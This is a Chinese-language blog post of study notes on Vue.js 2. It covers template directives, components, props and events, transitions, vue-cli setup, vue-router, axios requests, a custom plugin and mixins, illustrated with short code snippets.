<h2 id="用v-bind绑定属性"><a href="#用v-bind绑定属性" class="headerlink" title="用v-bind绑定属性"></a>用v-bind绑定属性</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-bind:title</span>=<span class="string">"notes.length + ' note(s) already'"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>简写<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">:title</span>=<span class="string">"notes.length + ' note(s) already'"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="用v-for显示列表"><a href="#用v-for显示列表" class="headerlink" title="用v-for显示列表"></a>用v-for显示列表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div v-for=&quot;item of items&quot;&gt;&#123;&#123; item.title &#125;&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>也可以使用关键字in<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div v-for=&quot;item in items&quot;&gt;&#123;&#123; item.title &#125;&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="动态CSS类"><a href="#动态CSS类" class="headerlink" title="动态CSS类"></a>动态CSS类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div :class=&quot;[&apos;one&apos;, &apos;two&apos;, &apos;three&apos;]&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>=&gt;<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;one two three&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div :class=&quot;&#123; one: true, two: false, three: true &#125;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>=&gt;<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;one three&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>建议将非动态的类放到静态属性中，因为Vue会对静态值做优化处理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;static&quot; :class=&quot;&#123; two: false, three: true &#125;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="条件模板v-if"><a href="#条件模板v-if" class="headerlink" title="条件模板v-if"></a>条件模板v-if</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div v-if=&quot;loading&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>此外还有v-else和v-else-if，也很好理解</p>
<h2 id="template标签"><a href="#template标签" class="headerlink" title="template标签"></a>template标签</h2><p>template标签不会出现在DOM中，可以对实际元素进行包裹<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template v-<span class="keyword">if</span>=<span class="string">"loading"</span>&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>主要用于模板内部，在数据展示之前或者传递给一个属性之前对其进行处理。</p>
<p>注册<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.filter(<span class="string">'date'</span>, time =&gt; moment(time)</span><br><span class="line">  .format(<span class="string">'DD/MM/YY, HH:mm'</span>))</span><br></pre></td></tr></table></figure></p>
<p>使用<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&#123;&#123; time | date &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="03"><a href="#03" class="headerlink" title="03"></a>03</h1><h2 id="模板选项"><a href="#模板选项" class="headerlink" title="模板选项"></a>模板选项</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  name: <span class="string">'app'</span>,</span><br><span class="line">  el: <span class="string">'#root'</span>,</span><br><span class="line">  template: <span class="string">`&lt;div id="#app"&gt;</span></span><br><span class="line"><span class="string">    Hello world!</span></span><br><span class="line"><span class="string">  &lt;/div&gt;`</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>并不在之前的#root中嵌入模板</p>
<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>组件是Vue应用的核心概念，是视图的一个个小部分。采用组件构建应用有助于应用的维护和升级，这已经成为了高效、可控地开发大型Web应用的标准方法。</p>
<p>组件有全局组件和局部组件。使用全局函数Vue.component()可以注册全局组件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'top-bar'</span>, &#123;</span><br><span class="line">  template: <span class="string">`&lt;div class="top-bar"&gt;</span></span><br><span class="line"><span class="string">    Top bar</span></span><br><span class="line"><span class="string">  &lt;/div&gt;`</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>使用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  template: <span class="string">`&lt;div id="#app"&gt;</span></span><br><span class="line"><span class="string">    &lt;top-bar /&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;`</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>其实每个组件都是Vue实例，Vue利用我们为top-bar组件提供的定义创建了Vue实例。</p>
<h2 id="使用prop进行父组件到子组件的通信"><a href="#使用prop进行父组件到子组件的通信" class="headerlink" title="使用prop进行父组件到子组件的通信"></a>使用prop进行父组件到子组件的通信</h2><p>将prop添加到组件中<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'top-bar'</span>, &#123;</span><br><span class="line">  props: [<span class="string">'currentPlayerIndex'</span>],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>使用v-bind简写语法将应用的数据绑定到prop值上<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;top-bar :current-player-index=&quot;currentPlayerIndex&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
<p>建议对prop的名字使用短横线命名方法，而在JavaScript代码中使用驼峰式命名方法。<br>在top-bar组件中使用prop，用法和使用数据属性一样。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'top-bar'</span>, &#123;</span><br><span class="line">  props: [<span class="string">'currentPlayerIndex'</span>],</span><br><span class="line">  template: <span class="string">`&lt;div class="top-bar"&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123; currentPlayerIndex &#125;&#125;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;`</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="在组件上监听原生事件"><a href="#在组件上监听原生事件" class="headerlink" title="在组件上监听原生事件"></a>在组件上监听原生事件</h2><p>Vue针对组件有自己的事件系统，叫做“自定义事件”。为了监听到组件的click事件，需要对v-on指令使用.native修饰符<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">card</span> @<span class="attr">click.native</span>=<span class="string">"handlePlay"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="使用自定义事件进行子组件到父组件的通信"><a href="#使用自定义事件进行子组件到父组件的通信" class="headerlink" title="使用自定义事件进行子组件到父组件的通信"></a>使用自定义事件进行子组件到父组件的通信</h2><p>在组件内部，使用$emit这个特殊方法触发的事件可以被父组件捕获到。该方法接收一个固定的参数，即事件类型：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$emit(<span class="string">'play'</span>)</span><br></pre></td></tr></table></figure></p>
<p>在同一个vue实例中，可以使用$on监听自定义事件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$on(<span class="string">'play'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'event'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>同时，$emit还会触发事件到父组件中，父组件可以使用v-on指令监听该事件<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">card</span> <span class="attr">v-on:play</span>=<span class="string">"handlePlay"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>简写<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">card</span> @<span class="attr">play</span>=<span class="string">"handlePlay"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>传参<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$emit(<span class="string">'play'</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="动画过渡效果"><a href="#动画过渡效果" class="headerlink" title="动画过渡效果"></a>动画过渡效果</h2><p>使用CSS过渡，结合特殊的<code>&lt;transition&gt;</code>组件，使用v-if或v-show指令来帮助过渡。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hand</span> <span class="attr">v-if</span>=<span class="string">"!show"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>当元素被添加到DOM时（进入阶段），<code>&lt;transition&gt;</code>组件会自动将下列CSS类应用到元素中。当然，过渡阶段也有相应的事件可以监听。</p>
<ol>
<li>v-enter-active:进入过渡状态被激活时，在元素插入DOM之前，并在动画结束时移除它。应该在该类中添加transition css属性并定义其过渡时长。</li>
<li>v-enter:进入过渡的开始状态。在元素插入DOM之前，添加该类到元素中，同时在元素被插入的下一帧移除。例如，你可以在这个类中设置透明度。</li>
<li>v-enter-to:元素进入过渡的结束状态。在元素插入DOM后的下一帧添加，同时v-enter被移除。当动画完成后，v-enter-to会被移除。<br>当元素从DOM中移除时（离开阶段），<code>&lt;transition&gt;</code>组件会自动将下列CSS类应用到元素中。</li>
<li>v-leave-active:离开过渡状态被激活时，会应用该类。当离开过渡触发时，添加该类到元素中，并在DOM中移除元素时移除它。应该在该类中添加transition css属性并定义其过渡时长。</li>
<li>v-leave:被移除的开始状态。当离开过渡触发时，添加该类到元素中，并在下一帧移除。</li>
<li>v-leave-to:元素离开过渡的结束状态。在离开过渡触发后的下一帧添加，同时v-leave被移除。当DOM中移除元素时，该类也会被移除。</li>
</ol>
<p>注：在离开阶段，并不会立即从DOM中移除元素。当过渡结束后，才会将其移除，这样用户可以看到动画效果。</p>
<p>一个基本的淡出动画效果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hand.v-enter-active,</span><br><span class="line">.hand.v-leave-active &#123;</span><br><span class="line">  transition: opacity 1s;</span><br><span class="line">&#125;</span><br><span class="line">.hand.v-enter,</span><br><span class="line">.hand.v-leave-to &#123;</span><br><span class="line">  opacity: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>由于可能需要复用这个动画，我们可以给它取个名字<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;transition name=&quot;fade&quot;&gt;</span><br><span class="line">  &lt;hand v-if=&quot;!show&quot; /&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure></p>
<p>需要修改css类<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hand.fade-enter-active,</span><br><span class="line">.hand.fade-leave-active &#123;</span><br><span class="line">  transition: opacity 1s;</span><br><span class="line">&#125;</span><br><span class="line">.hand.fade-enter,</span><br><span class="line">.hand.fade-leave-to &#123;</span><br><span class="line">  opacity: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>另外一个特殊的组件<code>&lt;transition-group&gt;</code>。当元素被添加、移除或移动时，该组件将对它的子元素做出动画效果。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition-group</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"item of items"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>transition-group默认情况下会作为span元素出现在DOM中。当然，也是可以修改的。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">tag</span>=<span class="string">"ul"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"item of items"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="特殊的key属性"><a href="#特殊的key属性" class="headerlink" title="特殊的key属性"></a>特殊的key属性</h2><p>当Vue更新存在于v-for循环中的DOM列表中，会尽量最小化DOM操作。尽可能的复用元素，并对DOM中需要修改的地方进行小范围修改。这意味着重复的元素会被打包到一起，不会在添加和移除列表中的项时移动它们。这也意味着对其应用过渡不会有动画效果。这时候就需要用key属性为元素指定唯一标识符。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"item of items"</span> <span class="attr">:key</span>=<span class="string">"item.id"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="使用插槽分发内容"><a href="#使用插槽分发内容" class="headerlink" title="使用插槽分发内容"></a>使用插槽分发内容</h2><p>我们使用slot元素可以将额外的布局和逻辑封装到overlay组件中，并且添加任意内容进去。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'overlay'</span>, &#123;</span><br><span class="line">  template: <span class="string">`&lt;div class="overlay" @click="handleClick"&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">      &lt;slot /&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>使用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;overlay&gt;</span><br><span class="line">  content</span><br><span class="line">&lt;<span class="regexp">/overlay&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="componennt组件"><a href="#componennt组件" class="headerlink" title="componennt组件"></a>componennt组件</h2><p>可以把其转换为任意组件<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">is</span>=<span class="string">"h1"</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">is</span>=<span class="string">"overlay"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="在script标签中编写模板"><a href="#在script标签中编写模板" class="headerlink" title="在script标签中编写模板"></a>在script标签中编写模板</h2><p>当定义组件时，使用这个ID引用模板即可。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/x-template"</span> <span class="attr">id</span>=<span class="string">"banner"</span>&gt;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="04"><a href="#04" class="headerlink" title="04"></a>04</h1><p>接下来介绍一个更接近实际使用的开发模式。</p>
<h2 id="vue-cli"><a href="#vue-cli" class="headerlink" title="vue-cli"></a>vue-cli</h2><p>可以帮助我们创建vue工程<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i -g vue-cli</span><br></pre></td></tr></table></figure></p>
<p>安装完成后执行<code>vue list</code>可以列出官方项目模板<br>主要有3种类型：</p>
<ol>
<li>simple:不使用构建工具</li>
<li>webpack: 使用webpack(推荐)</li>
<li>browserify: 使用browserify<br>我们使用webpack-simple,并逐步引入功能<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue init webpack-simple demo</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>这个模板具有最小可用的webpack配置。</p>
<h2 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h2><p>添加入口文件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">"#app"</span>,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(<span class="string">"div"</span>, <span class="string">"hello world"</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="运行应用"><a href="#运行应用" class="headerlink" title="运行应用"></a>运行应用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
<h2 id="配置Babel"><a href="#配置Babel" class="headerlink" title="配置Babel"></a>配置Babel</h2><p>默认的babel配置使用名为env的Babel预设，支持ES2015以来所有稳定的js版本，还有一个stage-3的Babel预设，支持即将推出的js特性，如async/await。<br>我们需要再添加一个，支持JSX。并且还需要包含Babel提供的polyfill，以便Promise和Generator等新特性可以在旧版浏览器中运行。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i -D babel-preset-vue babel-polyfill</span><br></pre></td></tr></table></figure></p>
<p>在.babelrc文件中添加vue预设<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"presets"</span>: [</span><br><span class="line">    [<span class="string">"env"</span>, &#123; <span class="attr">"modules"</span>: <span class="literal">false</span> &#125;],</span><br><span class="line">    <span class="string">"stage-3"</span>,</span><br><span class="line">    <span class="string">"vue"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在src/main.js中添加<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"babel-polyfill"</span></span><br></pre></td></tr></table></figure></p>
<h2 id="更新依赖"><a href="#更新依赖" class="headerlink" title="更新依赖"></a>更新依赖</h2><p>如果需要更新依赖，可以进行如下操作</p>
<ol>
<li>手动更新<br>检查是否有新版本<code>npm outdated</code><br>Wanted是兼容的版本号。手动更新修改一下package.json文件中的版本号在重新安装一下包即可。</li>
<li>自动更新<br><code>npm update</code>会更新最新的兼容版本<h2 id="构建生产环境资源文件"><a href="#构建生产环境资源文件" class="headerlink" title="构建生产环境资源文件"></a>构建生产环境资源文件</h2><code>npm run build</code><h2 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h2>广泛应用于实际开发，它包含3种类型的根块:</li>
<li>template </li>
<li>script</li>
<li>style<h2 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h2>是一种有助于编写渲染函数的语法，也可以采用。<h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2></li>
<li>有作用域的样式(scoped)<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>原理是会有特殊的属性添加到了模板元素上，使得选择器只会匹配这个组件的模板。</p>
<h2 id="添加预处理器"><a href="#添加预处理器" class="headerlink" title="添加预处理器"></a>添加预处理器</h2><p>lang属性可以指定预处理器语言(sass、less、Stylus)<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"sass"</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="组件内的组件"><a href="#组件内的组件" class="headerlink" title="组件内的组件"></a>组件内的组件</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Movie <span class="keyword">from</span> <span class="string">'./Movie.vue'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    Movie,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="05"><a href="#05" class="headerlink" title="05"></a>05</h1><h2 id="Vue插件vue-router"><a href="#Vue插件vue-router" class="headerlink" title="Vue插件vue-router"></a>Vue插件vue-router</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">'vue-router'</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter);</span><br></pre></td></tr></table></figure>
<h2 id="使用router-view进行布局"><a href="#使用router-view进行布局" class="headerlink" title="使用router-view进行布局"></a>使用router-view进行布局</h2><p>它将渲染匹配当前路由的组件<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app-layout"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="创建路由"><a href="#创建路由" class="headerlink" title="创建路由"></a>创建路由</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">'./components/Home.vue'</span></span><br><span class="line"><span class="keyword">import</span> FAQ <span class="keyword">from</span> <span class="string">'./components/FAQ.vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/'</span>, <span class="attr">name</span>: <span class="string">'home'</span>, <span class="attr">component</span>: Home &#125;,</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/faq'</span>, <span class="attr">name</span>: <span class="string">'faq'</span>, <span class="attr">component</span>: FAQ &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>路由名称name是可选的，方便在路由时不会导致链接失效。</p>
<h2 id="路由器对象"><a href="#路由器对象" class="headerlink" title="路由器对象"></a>路由器对象</h2><p>创建路由器对象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure></p>
<p>导入<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span>;</span><br><span class="line"><span class="keyword">import</span> AppLayout <span class="keyword">from</span> <span class="string">'./components/AppLayout.vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">"#app"</span>,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(AppLayout),</span><br><span class="line">  router,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h2><p>有hash(默认)、history、abstract。<br>hash与任何浏览器和服务器都兼容<br>history 浏览器需要支持HTML5 API。服务器必须配置为当访问如/faq时发送主页，而不是404。<br>abstract 可以在任何JavaScript环境中使用(包括Node.js)。如果没有可用的浏览器API,将被迫使用该模式。</p>
<h2 id="路由器链接"><a href="#路由器链接" class="headerlink" title="路由器链接"></a>路由器链接</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">"/faq"</span>&gt;</span>FAQ<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123; name:'faq' &#125;"</span>&gt;</span>FAQ<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>组件默认会使用router-link-active CSS类，你可以使用它改变激活时的样式。<br>exact 可以设置路径完全匹配<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123; name:'faq' &#125;"</span> <span class="attr">exact</span>&gt;</span>FAQ<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="发送后端请求"><a href="#发送后端请求" class="headerlink" title="发送后端请求"></a>发送后端请求</h2><p>vue官方推荐使用axios,初始渲染可以在created生命周期中发送后端请求，再设置相应组件里的data。(接入vuex后，数据可以由vuex来管理)。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> created() &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.loading = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> axios.get(<span class="string">'url..'</span>);</span><br><span class="line">    <span class="keyword">if</span> (res.ok) &#123;</span><br><span class="line">      <span class="keyword">this</span>.questions = res.data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125; </span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.loading = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="用自己的插件扩展Vue"><a href="#用自己的插件扩展Vue" class="headerlink" title="用自己的插件扩展Vue"></a>用自己的插件扩展Vue</h2><p>请求服务器数据的功能是自定义Vue插件的好例子。<br>创建一个插件，只有一个规则，插件应该是一个带有install方法的对象，该方法接受Vue构造函数作为第一个参数以及一个可选的options参数。然后，该方法通过修改构造函数为框架添加新特性。<br>这里，我们的插件将在所有组件上添加一个$fetch的特殊方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> baseUrl = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  install (Vue, options) &#123;</span><br><span class="line">    baseUrl = options.baseUrl;</span><br><span class="line">    Vue.prototype.$fetch = $fetch</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">$fetch</span> (<span class="params">method, url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> axios[method](<span class="string">`<span class="subst">$&#123;baseUrl&#125;</span><span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (res.ok) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用mixin复用代码"><a href="#使用mixin复用代码" class="headerlink" title="使用mixin复用代码"></a>使用mixin复用代码</h2><p>mixin可以在多个组件中复用组件定义（如计算属性、方法或侦听器）<br>mixin是可应用于其他定义对象（包括其他mixin）的组件定义对象。它看起来和普通组件定义完全一样。<br>Vue会自动合并标准选项，如钩子、数据、计算属性、方法和侦听器，最后应用的那个将覆盖之前的那些。组件自有选项最终合并。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      remoteDataLoading: <span class="number">0</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> RemoteData <span class="keyword">from</span> <span class="string">'../mixins/RemoteData'</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">  mixins: [</span><br><span class="line">    RemoteData,</span><br><span class="line">  ],</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
